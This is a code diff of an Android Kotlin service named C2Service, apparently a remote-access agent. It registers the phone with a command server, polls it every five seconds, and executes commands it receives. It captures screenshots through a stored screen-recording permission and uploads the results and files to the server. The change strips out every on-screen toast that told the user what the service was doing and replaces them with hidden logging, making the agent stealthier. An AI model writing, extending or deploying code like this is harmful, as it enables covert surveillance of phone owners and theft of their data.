@@ -11,7 +11,6 @@ import android.os.Handler
 import android.os.IBinder
 import android.os.Looper
 import android.util.Log
-import android.widget.Toast
 import androidx.core.app.NotificationCompat
 import kotlinx.coroutines.*
 import okhttp3.*
@@ -40,17 +39,19 @@ class C2Service : Service() {
 
     @Volatile private var projection: MediaProjection? = null
 
+    private fun log(msg: String) {
+        Log.i(TAG, msg)
+        LogBus.append(applicationContext, "C2", msg)
+    }
+
     override fun onCreate() {
         super.onCreate()
-        toast("C2Service onCreate")
-        Log.i(TAG, "onCreate deviceId=$deviceId")
-
-        // Start as dataSync first (safe without projection permission)
+        log("onCreate deviceId=$deviceId")
         startForegroundCompat(ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
 
         serverUrl = getSharedPreferences("c2", MODE_PRIVATE)
             .getString("server_url", BuildConfig.C2_URL)!!
-        Log.i(TAG, "serverUrl=$serverUrl")
+        log("serverUrl=$serverUrl")
 
         tryInitProjectionFromPrefs()
 
@@ -59,8 +60,7 @@ class C2Service : Service() {
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        Log.i(TAG, "onStartCommand action=${intent?.action}")
-        toast("onStartCommand action=${intent?.action}")
+        log("onStartCommand action=${intent?.action}")
 
         if (intent?.action == "START_PROJECTION") {
             val code = intent.getIntExtra("proj_result_code", Int.MIN_VALUE)
@@ -69,19 +69,13 @@ class C2Service : Service() {
             else
                 @Suppress("DEPRECATION") intent.getParcelableExtra("proj_data")
 
-            Log.i(TAG, "START_PROJECTION code=$code data=$data")
-            toast("START_PROJECTION received")
+            log("START_PROJECTION code=$code hasData=${data != null}")
 
             if (code != Int.MIN_VALUE && data != null) {
-                // 1. Promote to mediaProjection foreground type FIRST
-                startForegroundCompat(
-                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
-                )
-
-                // 2. Now it's legal to create the projection
+                startForegroundCompat(ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
                 initProjectionFromIntent(code, data)
             } else {
-                toast("START_PROJECTION invalid")
+                log("START_PROJECTION invalid: code=$code")
             }
         }
         return START_STICKY
@@ -96,40 +90,34 @@ class C2Service : Service() {
                 startForeground(NOTIF_ID, notification)
             }
         } catch (e: Exception) {
-            Log.e(TAG, "startForeground failed", e)
-            toast("startForeground failed: ${e.message}")
+            log("startForeground failed: ${e.message}")
         }
     }
 
     private fun initProjectionFromIntent(resultCode: Int, data: Intent) {
-        toast("initProjection: code=$resultCode")
-        Log.i(TAG, "initProjectionFromIntent code=$resultCode")
+        log("initProjection: code=$resultCode")
         try {
             val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
             try { projection?.stop() } catch (_: Exception) {}
             projection = null
 
             val proj = mpm.getMediaProjection(resultCode, data)
-            toast("getMediaProjection: $proj")
-            Log.i(TAG, "getMediaProjection returned=$proj")
+            log("getMediaProjection: $proj")
             if (proj == null) {
-                toast("getMediaProjection returned null")
+                log("getMediaProjection returned NULL — permission already used or invalid")
                 return
             }
 
             proj.registerCallback(object : MediaProjection.Callback() {
                 override fun onStop() {
-                    toast("projection onStop")
-                    Log.i(TAG, "projection onStop")
+                    log("projection onStop")
                     projection = null
                 }
             }, Handler(Looper.getMainLooper()))
             projection = proj
-            toast("projection ACTIVE")
-            Log.i(TAG, "projection ACTIVE")
+            log("projection ACTIVE")
         } catch (e: Exception) {
-            toast("initProjection ERROR: ${e.message}")
-            Log.e(TAG, "initProjection failed", e)
+            log("initProjection ERROR: ${e.message}")
             projection = null
         }
     }
@@ -138,15 +126,14 @@ class C2Service : Service() {
         val prefs = getSharedPreferences("c2", MODE_PRIVATE)
         val code = prefs.getInt("proj_code", Int.MIN_VALUE)
         val uri = prefs.getString("proj_data", null)
-        Log.i(TAG, "tryInitProjectionFromPrefs code=$code")
+        log("tryInitProjectionFromPrefs code=$code hasUri=${uri != null}")
         if (code == Int.MIN_VALUE || uri == null) return
         try {
             val data = Intent.parseUri(uri, 0)
-            // Promote to mediaProjection type before restoring
             startForegroundCompat(ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
             initProjectionFromIntent(code, data)
         } catch (e: Exception) {
-            Log.w(TAG, "parseUri failed: ${e.message}")
+            log("parseUri failed: ${e.message}")
         }
     }
 
@@ -172,7 +159,7 @@ class C2Service : Service() {
                 val info = DeviceInfo.snapshot(this, deviceId)
                 postJson("$serverUrl/api/agent/register", info)
             } catch (e: Exception) {
-                Log.w(TAG, "register failed: ${e.message}")
+                log("register failed: ${e.message}")
             }
             delay(30_000)
         }
@@ -184,13 +171,13 @@ class C2Service : Service() {
                 val body = JSONObject().put("device_id", deviceId)
                 val resp = postJson("$serverUrl/api/agent/poll", body)
                 val cmds = resp?.optJSONArray("commands") ?: JSONArray()
-                if (cmds.length() > 0) Log.i(TAG, "received ${cmds.length()} commands")
+                if (cmds.length() > 0) log("received ${cmds.length()} commands")
                 for (i in 0 until cmds.length()) {
                     val cmd = cmds.getJSONObject(i)
                     scope.launch { execute(cmd) }
                 }
             } catch (e: Exception) {
-                Log.w(TAG, "poll failed: ${e.message}")
+                log("poll failed: ${e.message}")
             }
             delay(5_000)
         }
@@ -200,31 +187,34 @@ class C2Service : Service() {
         val id = cmd.getInt("id")
         val type = cmd.getString("type")
         val args = cmd.optJSONObject("args") ?: JSONObject()
-        Log.i(TAG, "execute id=$id type=$type projection=$projection")
+        log("execute id=$id type=$type hasProjection=${projection != null}")
 
         val result = try {
             when (type) {
                 "screenshot" -> {
                     val p = projection
                     if (p == null) {
-                        toast("screenshot: projection NULL")
+                        log("screenshot: projection NULL")
                         JSONObject().put("error", "projection_not_ready")
                     } else {
-                        toast("screenshot: capturing...")
+                        log("screenshot: capturing...")
                         Screenshot.capture(this, p)
                     }
                 }
                 else -> CommandExecutor.run(this, type, args)
             }
         } catch (e: Exception) {
-            Log.e(TAG, "execute failed", e)
+            log("execute failed: ${e.message}")
             JSONObject().put("error", e.message ?: "unknown")
         }
+
+        val ok = !result.has("error")
+        log("result id=$id type=$type ok=$ok")
 
         val payload = JSONObject()
             .put("command_id", id)
             .put("device_id", deviceId)
-            .put("success", !result.has("error"))
+            .put("success", ok)
             .put("result", result)
         try { postJson("$serverUrl/api/agent/result", payload) } catch (_: Exception) {}
 
@@ -243,9 +233,9 @@ class C2Service : Service() {
             }
             try {
                 Uploader.uploadB64(this, serverUrl, deviceId, id, category, dataB64, "$type.$ext")
-                Log.i(TAG, "uploaded $type.$ext")
+                log("uploaded $type.$ext (${dataB64.length / 1024} KB)")
             } catch (e: Exception) {
-                Log.w(TAG, "upload failed: ${e.message}")
+                log("upload failed: ${e.message}")
             }
         }
     }
@@ -262,17 +252,8 @@ class C2Service : Service() {
             }
         }
 
-    private fun toast(msg: String) {
-        try {
-            Handler(Looper.getMainLooper()).post {
-                Toast.makeText(applicationContext, msg, Toast.LENGTH_SHORT).show()
-            }
-        } catch (_: Exception) {}
-    }
-
     override fun onDestroy() {
-        toast("C2Service onDestroy")
-        Log.i(TAG, "onDestroy")
+        log("onDestroy")
         try { projection?.stop() } catch (_: Exception) {}
         projection = null
         scope.cancel()
